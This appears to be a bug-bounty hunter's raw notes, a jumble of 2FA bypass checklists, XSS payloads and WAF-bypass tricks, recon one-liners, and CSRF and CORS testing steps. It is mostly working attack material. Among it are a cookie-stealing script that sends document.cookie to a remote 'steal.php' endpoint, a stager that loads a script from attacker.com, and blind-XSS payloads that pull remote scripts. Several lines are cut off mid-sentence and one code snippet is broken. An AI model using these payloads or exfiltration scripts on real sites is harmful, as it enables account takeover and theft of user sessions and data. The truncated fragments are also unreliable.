2FA, it is possible to carry out all functions without a need for 2FA
[ ] 2FA Refer Check Bypass
1. Directly Navigate to the page which comes after 2FA or any other authenticated
page of the application.
2. If there is no success, change the refer header to the 2FA page URL. This may fool
application to pretend as if the request came after satisfying 2FA Condition
[ ] 2FA Code Leakage in Response
1. At 2FA Code Triggering Request, such as Send OTP functionality, capture the Request.
2. See the Response of this request and analyze if the 2FA Code is leaked.
[ ] JS File Analysis
1. while triggering the 2FA Code Request,
2. Analyze all the JS Files that are referred in the Response

3. to see if any JS file contain information that can help bypass 2FA code.
[ ] Lack of Brute-Force Protection
This involves all sort of issues which comes under security misconfiguration such as
lack of rate limit, no brute-force protection, etc.
1. Request 2FA code and capture this request.
2. Repeat this request for 100-200 times and if there is no limitation set, that's a rate limit
3. At 2FA Code Verification page, try to brute-force for valid 2FA and see if there is any succ
4. You can also try to initiate, requesting OTPs at one side and brute-forcing at
another side. Somewhere the OTP will match in middle and may give you a quick result
[ ] Password Reset/Email Change - 2FA Disable
1. Assuming that you are able to perform email change or password reset for the
victim user or make victim user do it by any means possible.
2. 2FA is disabled after the email is changed or password is reset. This could
be an issue for some organizations. However, depends on case by case basis.
[ ] Missing 2FA Code Integrity Validation
1. Request a 2FA code from Attacker Account.
2. Use this valid 2FA code in the victim 2FA Request and see if it bypass the 2FA Protection.
[ ] Direct Request
1. Directly Navigate to the page which comes after 2FA or any other authenticated
page of the application.
2. See if this bypasses the 2FA restrictions.
3. try to change the **Referrer header** as if you came from the 2FA page.
[ ] Reusing token
1. Maybe you can reuse a previously used token inside the account to authenticate.
[ ] Sharing unused tokens
1. Check if you can get the token from your account and try to use it to bypass the 2FA in a diff
[ ] Leaked Token
1. Is the token leaked on a response from the web application?
[ ] Session permission
1. Using the same session start the flow using your account and the victim's account.
2. When reaching the 2FA point on both accounts,
3. complete the 2FA with your account but do not access the next part.
4. Instead of that, try to access the next step with the victim's account flow.
5. If the back-end only set a boolean inside your sessions saying that you have successfully pass
[ ] Password reset function
1. In almost all web applications the **password reset function automatically logs the user into
2. Check if a **mail** is sent with a **link** to **reset the password** and if you can **reuse**
[ ] Lack of Rate limit
Is there any limit on the number of codes that you can try, so you can just brute force it? Be ca
[ ] Flow rate limit but no rate limit
In this case, there is a flow rate limit (you have to brute force it very slowly: 1 thread and so
[ ] Re-send code and reset the limit
There is a rate limit but when you "resend the code" the same code is sent and the rate limit is
[ ] Client side rate limit bypass
{% content-ref url="rate-limit-bypass.md" %} rate-limit-bypass.md {% endcontent-ref %}
[ ] Lack of rate limit in the user's account
Sometimes you can configure the 2FA for some actions inside your account (change mail, password..
[ ] Lack of rate limit re-sending the code via SMS
You won't be able to bypass the 2FA but you will be able to waste the company's money.
[ ] Infinite OTP regeneration
If you can **generate a new OTP infinite times**, the** OTP is simple enough** (4 numbers), and y
[ ] Guessable cookie
If the "remember me" functionality uses a new cookie with a guessable code, try to guess it.

When the 2FA is enabled, previous sessions created should be ended. This is because when a client
[ ] Improper access control to backup codes
Backup codes are generated immediately after 2FA is enabled and are available on a single request
[ ] Information Disclosure
If you notice some confidential information appear on the 2FA page that you didn't know previousl
[ ] Bypass 2FA with null or 000000
[ ] Previously created sessions continue being valid after MFA activation
1 access the same account on https://account.grammarly.com in two devices
2 on device 'A' go to https://account.grammarly.com/security > complete all steps to activate the
Now the 2FA is activated for this account
3 back to device 'B' reload the page The session still active
[ ] Enable 2FA without verifying the email I able to add 2FA to my account without verifying my email
Attack scenario :
Attacker sign up with victim email (Email verification will be sent to victim email).
Attacker able to login without verifying email.
Attacker add 2FA.
[ ] Password not checked when disabling 2FA
PoC
1- go to your account and activate the 2FA from /settings/auth
2- after active this option click on Disabled icon beside Two-factor authentication.
3- a new window will open asking for Authentication or backup code - Password to confirm the disable

4- in the first box enter a valid Authentication or backup code and in the password filed enter a
5- the option will be disabled successful without check the validation of the password.
[ ] “email” MFA mode allows bypassing MFA from victim’s device when the device trust is not expired
Steps To Reproduce:
Note:
1-Use burp suite or another tool to intercept the requests
2-Turn on and configure your MFA
3-Login with your email and password
4-The page of MFA is going to appear
5-Enter any random number
6-when you press the button "sign in securely" intercept the request POST auth.grammarly.com/v3/a
"mode":"sms" by "mode":"email"
"secureLogin":true by "secureLogin":false
7-send the modification and check, you are in your account! It was not necessary to enter the pho
[ ] 2FA bypass by sending blank code
1- Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_i
2- Enable 2FA
3- Logout
4- Login again and notice OTP is asked
5- Now using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
6- Before forwarding the request to server, remove the code and forward
7- Turnoff Intercept and notice that your login request has been fulfilled


tip
Browser A: The attacker opens the login page and enters credentials for an account without 2FA

Browser B: The attacker opens the login page and enters credentials for the victim who has 2FA enabled. Consequently, they are redirected to /login/key/random_key

Browser B: The attacker substitutes the session ID with Browser A's session ID and refreshes the page

Browser B: The converter page generates a JWT for the attacker, enabling successful authentication as the victim who has 2FA enabled

  tip  tip
Create an account https://example[.]com/register
Fill in all the required data enter the phone number and send the form.
We will receive a five-digit OTP on the phone number used for registration. Enter any random 5 digits, e.g. 00000
Intercept the request with burp suite proxy, choose the option “Do intercept >> response to this request” and hit Forward.
5. We will receive a response with 500 500, modify it to 200 OK, and forward the request





             Xss    XSS         XSS           XSS
             
check for xss cheatsheat
  echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
  echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
  waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
  
  gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
  
      BLIND XSS
  cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
  
  
  httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
  
  
  cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)

<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">


Payload XSS (cross-site scripting) on login page:

');\\</script><script>alert(document.cookie)</script>('%00tst@tst.com.br

   `“‘><img src=x onerror=promtp(7)>`”’${{8*8}}      for xss, csti, and html injection
   
   
   tip
   check which waf is used
   wafwoof https://url
   check for basic html injection
   <h1>test</h1>
<a>click here</a>
<title>test</title>  if render, try to excalate to xss



xss tip
Methodology:
1) Identify bug bounty
2) Enumerate sub domains (I use amass, subfinder)
3) Feed those to httpprobe   
4) Feed that list to a crawling tool       hawrawler
5) Feed that list to kxss
6) grep output for " (easiest win)



REFLECTED
1)
Use Gau or Wayback urls to passively gather urls of the target.
Filter the parameters using grep "=" or gf patterns and store it in a new file.
Now run Gxss or bxss on that new file.
Check Reflected Param Manually or use some tool like dalfox

  payload   “hello<form/><!><details/open/ontoggle=alert(‘W13D0M’)>”@gmail.com
  
  alwys check for clickhijacking when any subdomain is reflecting  xss

ANALYSIS
$cat domains.txt | gau --threads 5 > output.txt                                i think in order to reduce noice, i will stick with in scope url //time shall tell
grep '=' output.txt | grep '&' > filtered_urls.txt     or  grep '=' urls.txt | grep -vE '\.(jpg|png|css|js|ico|gif|...)$' > filtered_urls.txt
       
 cat filtered_url.txt | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
     OR
   cat filtered_url.txt | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"  or use another payload
   then 
   cat urls.txt | dalfox pipe -f payloads.txt           remember, that the payload.txt is the list of your xss payload in a file
   
   
   blind xss in azure 
   use first name = half payload last name = another half payload and in general name will be full payload so it will bypass filter
   
   
   
   ALWAYS REMEMBER TO CHANGE ALERT TO PROMPT 
   
  CHECK FOR   BURP SUITE'S DOM INVADER 
  
  tip tip

Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
Open the confirmation email and click on View web version to access the vulnerable XSS URL.
Copy that vulnerable XSS URL and send it to the victim.

  tip 2
  
  Open the Contact Support endpoint (https://example.com/contact?submitted=false)
Inject the XSS payload in any field and Submit the form
You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
You will find the XSS alert :)
   
   
   **Tips***  FOR XSS FIREWALL BYOASS
   Check if the firewall is blocking only lowercase
   examples:     <scRipT>alert(1)</scRipT>
   
   Try to break firewall regex with the new line(\r\n)
   Ex:- <script>%0alert(1)</script>
   
   Try Double Encoding
   Ex:- %2522
   
   Testing for recursive filters, if firewall removes text in red, we will have clear payload
   Ex:- <src<script>ipt>alert(1);</scr</script>ipt>
   
   Injecting anchor tag without whitespaces
    Ex:- <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
    
    Try to bypass whitespaces using Bullet
    Ex:- <svg•onload=alert(1)>
    
    Try to change request method
    Ex:- GET /?q=xss  POST/ q=xss
    
    Try CRLF Inection
    Ex:- GET /%0A%ODValue=%20Virus
     POST 
     Value= Virus
     
     
     exception marked as on //
     input on text boxes A<h1>A.
     document.location='https://ł.rip/save.php?c='+document.cookie;    this for stealing cookies
     
     
     
     <<<<<FASTEST WAY TO FIND XSS  >>>>>
 inject  this  "><script>alert(document.cookie)</script>      into every parameter on every page of the applicetion,  if the attack string appears unmodifiedin the response , that indicates an xss vulnerabilty
     
    
   
2)
Using Burp
Download Reflection and sentinal plugin for burp.
Walk and spider the target site.
Check the reflected params tab in burp
send that sentinal or check manually.

3)
Use Methods 1 or 2 to Gather the urls
Enumerate the Firewall using https://github.com/Ekultek/WhatWaf or other similar tool.
Find WAF bypass payload on twitter by searching or in this Github Repo https://github.com/0xInfection/Awesome-WAF
Also Use Arjun to find hidden params.

4
Find Hidden Variables In Source Code.
Check Javascript file or html Source file for hidden or unused variables
You can Manually Check Right Click View Page Source and search for var= , ="" , =''.
Now Append that to webpage urls. For example https://example.com?hiddenvariablename=xss.

Tips
Check the error pages (404,403,..) sometimes they contain reflected values
Trigger a 403 by trying to get the .htaccess file
Try every reflected parameter


STORED XSS  ARE MOSTLY FOUND MANUALLY
Enumerate the Firewall using above Methods and select a payload to test accordingly.
Try that selected WAF bypass payload while registering on a site in fields like username, name, address, email, etc.
Try Payload in File name of profile picture and also in the source file of image.
Try in Comment section anywhere on target site.
Try on every input fields which get reflected in page and which can be seen by other users.
Try to signup using your name + xss payload and that can lead to stored xss.



ANOTHER TIPS
Open the Contact Support endpoint (https://example.com/contact?submitted=false)
Inject the XSS payload in any field and Submit the form
You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
You will find the XSS alert :)
    shorter way
Open the contact support endpoint (https://example.com/contact?submitted=false)
Inject the XSS payload in any field BUT enter anything wrong or leave any required field missing in the form and then Submit the form.
You will find the XSS alert :)


another TIP 
Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
Open the confirmation email and click on View web version to access the vulnerable XSS URL.
Copy that vulnerable XSS URL and send it to the victim.


chatgpt explanation

Inject XSS Payload:

Injected an XSS payload into the "First Name" field during account sign-up.
Encounter Access Issue:

Encountered a "403 Forbidden" error when attempting to log in.
Analyze Login Requests:

Used Burp Suite to intercept login requests and discovered two POST requests.
Identify the Problem:

Suspected the XSS payload in the "firstName" parameter of the second request was causing the issue.
Resolve Self-XSS:

Removed the XSS payload from the second request, successfully logged in, and noticed a Self-XSS alert.
Exploit the Vulnerability:

Explored account settings and found the ability to change the email address.
Email Confirmation:

Changed the email address to another owned address and received a confirmation email at the original email.
Trigger XSS via Email:

Clicked "View web version" in the email, triggering the XSS alert.
Share the Vulnerability:

Obtained a URL that triggered the XSS alert and could be shared with others.


NOTE TIP
 WHEN an  application used AngularJS, with the library loaded from the same domain  always try to load AngularJS library without violating the CSP. We could then use Angular templating functionality to inject malicious code
  the payload creation process involved importing the AngularJS library and using Angular directives to initiate the payload, making use of the $event.view object, which exposed the window object. This approach effectively bypassed the CSP, allowing us to execute our payload. you could also  URL-encoded the payload above and injected it to error_description parameter



my explaination
create a account and first login in clearly on the first request
on the second request, Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
log in to your previously first  created account while intercepting the login request,    remove the XSS payload from the firstName parameter of the second request.
Go to the  second created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
Open the confirmation email and click on View web version to access the vulnerable XSS URL.



///////////
Bug Bounty Tip

HTML entities can help you bypass WAF filters

1) bypass block of single quote '
?url=home%26apos;-alert(1)//
onclick="location='/home&apos;-alert(1)//'"

2) bypass block of colon :
?url=javascript%26colon;alert(1)
href="javascript&colon;alert(1)"

analysis 
************TIP******
inject  <a href=#>test</a>  in every  Input fields such as  text boxes, text areas, drop-down lists, checkboxes, radio buttons, and more.
and then trry to obfuscated payods
FOR WAF BYPASS for STORED xss
 
wheere payload  is <script>alert('XSS')</script>  // check for more strong xss payloads and run the following encode payload //  use chapgpt to genearte encoding payloads
encode payload

XSS polygot
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e

      basic xss filter bypass
      1) using ann html img tag instead of script
      2)when alert is blocked, prompt can be used ...  alert (1) to prompt(1)
      3) backtrick can be used when bracket is filter ....  alert(1) to alert`1`  or use alert(String.fromCharCode(88,83,83)) when string are blocked
      
      
      

 CLOUDFLARE BYPASS [XSS]
PAYLOAD:
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))> 
 - <img src=x on0x=1 onerror=alert(document.cookie)>






🌐ColdFusion  XSS
POC:
{{host}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(document.domain)


  Here's a small #XSS list for manual testing (main cases, high success rate).
"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)
    
    Sucuri bypass payload 
<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>

some browers tolearate extra bracket
  <<script>alert(10);//<</scripts>

using invalid tags
<x onclick=alert(1) src=a>click here </x>


beating the lenght limit  example
  https://mypaa.com/account.php?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*</script>
  

 
       Email 

“><svg/onload=confirm(1)>”@gmail.com     
  "><svg/onload=confirm(1)>"@x.y 
  test+(<script>alert(document.domain)</script>)@gmail.com
just try this payload:
test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E


test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
  
      
      

url encoding of payload 


`%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`    

Hex encoding of payload
`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`

BASE 64
PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

unicode encodng
\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E


USING COMBINATION OF ALL TECHNIQUES

URL Encoding + Hex Encoding:


Base64 Encoding + Unicode Encoding:  and 

combination of all technique 

BYPASSING XSS FILTERS

&#60;script&#62;alert(1)&#60;/script&#62;

%3Cscript%3Ealert(1)%3C/script%3E       if the filter only works for plain text string

\\x3cscript\\x3ealert(1)\\x3c/script\\x3e            if filter only looks for alphabatical string

\\u003cscript\\u003ealert(1)\\u003c/script\\u003e        if the filter looks for ASCII strings

%26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;


Blind XSS
Use burpcollaborator or ngrok

1- Review forms
2- Contact Us pages
3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
4- Address fields of e-commerce sites
5- First or Last Name field while doing Credit Card Payments
6- Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
7- Log Viewers
8- Feedback Page
9- Chat Applications
10- Any app that requires user moderation          

  stepss when hunting for bliind xss in an e-commerce website
     when filling out forms allows sticks with the src tag andalso make alot of assumption
     name :   '"://></script></script/src=http://url.com/      remember to change url parameter, shpould in case url is been filltered 
     <input data = ""/><script/src=//"..."></script>
      strick on the delivery not or any input field
      
     "'"/></textarea></script/script><script/src=https://url.com/              check for proxy and place ypur payload proxy replace field this is notifty when you xss are been fired 
     

   Top 3 RXSS payloads I use:

`'";//><img/src=x onError="${x};alert(`1`);">

`'";//><Img Src=a OnError=location=src>

`'";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>      

   tip on xss
   Got an image upload functionality?
   Let's see how we can popup an XSS here 😉
   Create a file having XSS payload and save it with an extension (check what file type is allowed on trial-error basis)
   There are different ways to create this file, check it out 👇
     https://t.co/bLFt57NlAb
      If you're looking for a R-XSS (eg. payload in filename) then you will see the popup immedietly after upload. If it's stored, you will have to hit the URL where the payload is served.
        



            DOM XSS
Tips
Would not recommend manually looking for DOM XSS
Burp suite PRO scanner can find DOM XSS
Tool: https://github.com/dpnishant/ra2-dom-xss-scanner

www.gap.com/email?message=<script>alert("hi")</script>


       go install github.com/KathanP19/Gxss@latest
     
     Tips to find DOM XSS: ⚡️🔥
 never use source while testing for dom xss
1. Start Burpsuite Community Edition 
2. Click on Open Browser 
3. Go and click on the Burp icon in extension tab on browser 
4. Click on Turn on DOM Invader 
5. Inject a custom canary 
6. Open target website, right click, Inspect and go to Invader
7. Now Click on Inject URL or Inject Form
8. Check Reflection of canary
9. If all goes well, You will see the green exploit button
10. Click it to get Dom XSS poc 
11. If doesn’t work, repeat the same on different url, functionality. 

/////////
 if string enters in double qoute, we might break out by using double qoute
 REMEMBER
 if you data get url- encoded before being processed, it is unlikely an xss will work

   


///
eval(alert(document.domain))
location.hash       https://oldnavy.gap.com/#test          change the string ? to # if empty
location.search   .... place a random value into it
  example
  https://www.gogle.com/submit.thml?email=sdddhhhd
  it would return ?email=sdddhhhd

window.location.hash.slice(1)

   /#<iframe src="www.google.com" onload="this src+='<img src=1 onerror=alert(1)"'>
 
     


    idea (someone) for finding xss
amass enum -d target.com -o /filepath/subdomains.txt
 sort -u subdomains.txt | httprobe > /filepath/uniq.txt
 eyewitness --web -f uniq.txt -d /path_to_save_screenshots

 It took few minutes and after that I just wrote a simple script to embed those png screenshots with html so that I can view them directly in my browser.
for I in $(ls); do 
        echo "$I" >> index.html;
        echo "<img src=$I><br>" >> index.html;
done
  I used paramspider to extract the parameters of that subdomain
 paramspider -d target.com > /filepath/param.txt
 dalfox -b hahwul.xss.ht file param.txt

        
        use the browerser console to alwys poop out and check payload on a given page 
  including long payloads/ escalation of xss beyond alert box
  <script src="http://nw.rs"></script>
  getScript("http://nw.rs",function(){});    this is by using jquery 
  
 Note //  if you are exploiting an XSS on a page that uses HTTPS, you will need to pull the XSS payload from a link that also uses HTTPS, otherwise the browser will refuse to load it with a “Mixed Content” error. because of cors 
 
 Bypassing CSRF Tokens //
 by loading the form within an iframe. If the page is loaded within an iframe, then the form will automatically include the CSRF token within the form, 
 
 once we bypass sop and csrf token then ACCOUNT TAKEOVER 
 
 Change the user’s password
Change the user’s email address or phone number to our own, and then use the forgot password functionality to update their password
Change the user’s security questions

 // the shortest payload I know of that does not pull an external script is 20 characters long  it is used when there is less than 20 character string     <svg/onload=alert()>
 
 
 session hijacking payload  on an form 
 <script>
var sessionId = document.



ie.match(/sessionId=(.*?)(;|$)/)[1]
</script>

payload for a data theft using xss

<script>
var stolenCookies = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://yourserver.com/steal.php?data=' + encodeURIComponent(stolenCookies), true);
xhr.send();
</script>       


java%0d%0ascript%0d%0a:alert(0) 
 j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` 
 java%07script:prompt`0` 
 java%09scrip%07t:prompt`0` 
 jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`


($$ \unicode{<img src=1 onerror=alert(1)>} $$) 





Pay careful attention to where your injection takes place. 
For example, a clothing store may have a filter to show only shirts in the color blue. Added to the URL could be something along the lines of /?s=color_blue.

Often times the first instinct is to inject by replacing everything after the =. Try replacing only the portion reflected on that page or the parameter you're looking to filter. Example /?s=color_<script>alert()</script>.

Another injection point may be entering the payload after the filter like the example in these images. Example /?s=color_blue<script>alert()</script>


   lesser known payload   /replace video with music, or image
<video onerror="alert(1)">


This payload puts a twist on requiring user interaction. By injecting a style tag, we manipulate the size of the HTML tag to be the size of the screen. Any mouse movement on the page will pop the alert.
   1"%20onmouseover="alert(document.domain)"%20style="position%3Aabsolute;%20top%3A0;%



        /?search=<IMG%20SRC=1%20onmouseover=alert()>             USING CASE SENSETIVE
        
        
        
        running 404 page example
        
        conduct a subdomain enumeration using tools such as Subfinder, Amass, and crt.sh.
        performed a DNS brute force, resulting in the discovery of nearly 40,000 subdomains. 
        running HTTPX on these subdomains, Ito identified  2,500 live and active ones.
        check for active subdomain painstakly
        
         encountering the 403 Error,  decide to test whether if it is  a global restriction affecting all pages or specific to the main page by providing the subdomain with a dummy path.
         example  = rplicense.redacted.com/dummy
         
         After inputting the dummy path, the 403 status code might  transformed into a 404 Not Found, indicating that the 403 code was exclusive to the main web page and not applicable to every        c    conceivable path. At this point, commenced fuzzing the web application using ffuf along with a wordlist named raft-large. 
      Here’s the command:   
      ffuf -u "rplicense.redacted.com/FUZZ" -w /path/to/word-list -H "User-Agent: Mozilla/5.0 (Galaxy S22; Android 6) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/111.0.5628.105 Mobile Safari/537.48" -  rate 20  also fuzz achive/directory and check for forms and sumit payload where neccasry
 

   --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src= https://tetstst.com></scrIpt>

  WEAPONING XSS
  
NOTE: WHEN having a simple XSS in alert form But when we attempted to demonstrate its impact or leverage it beyond an alert we have nothing! Thankfully, if you find yourself in this situation, you can write a compact XSS stager with 98 characters using the following JavaScript syntax (note, you could save a few more characters by registering a shorter domain name and using an index page):   
  <svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/p' hidden/>
  
 NOTE:  when injecting an  XSS payload let say we excute the alert(1)” payload, and the page got empty we notice something is wrong in the background. Some of the page is missing... So why can’t we access it? The problem is with our injection point; where it is in the page. If you're injecting code before an element you need to access, you first need to wait for the DOM to finish being built before your code executes. This is because the page is built "top-to-bottom" and in this case our payload is injected into the “To” field which comes before the "csrf" token field. As such the “csrf” element does not yet exist at the time of execution as the DOM hasn’t finished being built! This is why some elements are missing when we execute an alert.
  
To compensate for this, you can attach an event listener to the document which will trigger your code once the DOM has completed its loading process. As ever, there are multiple ways to do this but the “by design” event for handling this is called “DOMContentLoaded”, and can be used as follows:

  ?name="><script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
  
  when CSP is not your friend   "lol". We can no longer execute inline JS, so we cannot directly inject a reflected XSS payload. Furthermore, we now also can’t load JS resources outside of the application’s own origin ..  To bypass the CSP policy and get back to our ever-reliable alert box we can use this 2nd injection URL as the source for the first XSS injection script - think XSS-inception (Remember to use double URL encoding):
   
   ?name=Bob<script src='https://demoapp.loc/js/script?v=1.7.3.css%2522/>%2527)%3Balert(%2522Yeah!%2520Chaining!%2522)%3B//'></script>
  
 NOTE:    allow try to copying CSRF token from a different browser session and see if you can reuse it // this could to lead to chainging xss with csrf AND CSRF BYPASS
 
 
 
 Payload - <svg+viewBox="0+0+50+50"+xmlns="http://w3.org/2000/svg">+++++<rect+width="10"+height="10">+++++++++<animate+onbegin=alert(1)+attributeName="rx"+values="0;5;0"+dur="10s"+/>+++++</rect>
 
 
 xss oneliner   //   
        How to Hunt Blind XSS using Dalfox //
  waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
  
   How to Hunt Reflected XSS
  waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
    
    Find the parameters which are not filtering special characters - One Liner
     echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt




     USING XSS-VIBES    check docs
     first test for dangerous charaters .. this involves =batman" in url links and check if it is reflected in , if reflected, apply some apyload 
     on xss-vibes directory
     katana -u "url" -o katana.txt
      python3 main.py -f katana.txt -o xss_vibes.txt
       python3 main.py -f katana.txt -o --waf                  // to dectect if there is web application firwall
      python3 main.py -f katana.txt -w cloudflare -t 5        //specify the firewall
     
     
     
     adding payload on xss-vibes
     $ python3 added.py -p "payload"
      $ python3 added.py -p "payload"  -w cloudflare
      $ python3 added.py -f payload.txt -w  wordfence                adding a payload with filename and also speciflying the name 
     
     USING MY NUCLEI TEMPLET FOR XSS 
     nuclei -l url.txt -t xss.yml                   this is on my desktop/tool
     
     
     https://brutelogic.com.br/poc.svg // this is url for xss
     
     
     
     CSRF      CSRF              CSRF       CSRF     CSRF
     https://medium.com/@drthkol478/csrf-bug-hunting-methodology-intermediate-4d0df3b63b59
     
     note:  any place on the app that manipulates user data is a potential CSRF vector.
     remember: If a function adds, deletes or modifies data it is definitely worth investigating!
     To test if this security measure can be bypassed, we can use a couple techniques. The first one is to simply modify the first value, then the second one by adding a single quote, therefore making it invalid. Then we can check if the request got accepted by the server
     we can also try again by  deleting the anti-csrf tokens. Firstly we try to delete the first value, then the second one and finally both of them
    we could try to change the HTTP Method   or supply a “_method” parameter 
    we can also login into another account on the application and and trying to swap their tokens with the ones from our ‘attacker’ account. Then we can trigger the email change, send it to the Repeater tab and then simply replace the values.
    
    
  ?search=123%0D%0DSet-Cookie%3a%20csrfKey=JlqAkNz2e6MTQ2H6oW5SsiGKs7g46XCX7
  
  note:  when csrf isnt preset in the response , Put a another domain in the referer.Append a letter to the original domain or change it.  and also
Try deleting the header entirely 

Always try modifying or deleting anti-csrf values.
Look for additional vectors like CRLF injection when non session tied cookies are implemented as a security measure.
Even if something looks secure, dig dip, try every angle and only then move on :)
   
  CORS  BYPASSING / MISCONFIGURED
  ffuf
  ffuf -w subdomains-top1million-5000.txt -u http://10.20.30.40 -H 'Origin: http://FUZZ.target.com' -mr "Access-Control-Allow-Origin" -ignore-body

  
  hunting 1 (single target)
  
  Step->1. Capture the target website and spider or crawl all the website using burp.
 Step->2. Use burp search look for Access-Control
 Step->3. Try to add Origin Header i.e,Origin:attacker.com or Origin:null or Origin:attacker.target.com or Origin:target.attacker.com
 Step->4  If origin is reflected in response means the target is vuln to CORS
 
 hunting 2 (muitple target)
 step 1-> find domains i.e subfinder -d target.com -o domains.txt
 step 2-> check alive ones : cat domains.txt | httpx | tee -a alive.txt
 step 3-> send each alive domain into burp i.e, cat alive.txt | parallel -j 10 curl --proxy "http://127.0.0.1:8080" -sk 2>/dev/null
 step 4-> Repeat hunting method 1
 
   (1) Automate Way 
    step1-> find domains i.e, subfinder -d domain.com -o target.txt
  step2-> grep alive: cat target.txt | httpx | tee -a alive.txt
  step3-> grep all urls using waybackurls by @tomnomnom and gau tool i.e,cat alive.txt | gau | tee -a urls.txt
  step4-> run any of these tools on each url 
  step5-> configure the manually
  
    ////Tools  for 1/////
    https://github.com/chenjj/CORScanner
    https://github.com/lc/theftfuzzer
    https://github.com/Shivangx01b/CorsMe
    
    automation 2 
    1) Find Domains with the help of subfinder,assetfinder,findomain i.e , subfinder -d target.com | tee -a hosts1 , findomain -t target.com | tee -a hosts1 , assetfinder --subs-only target.com |tee -a hosts1 .
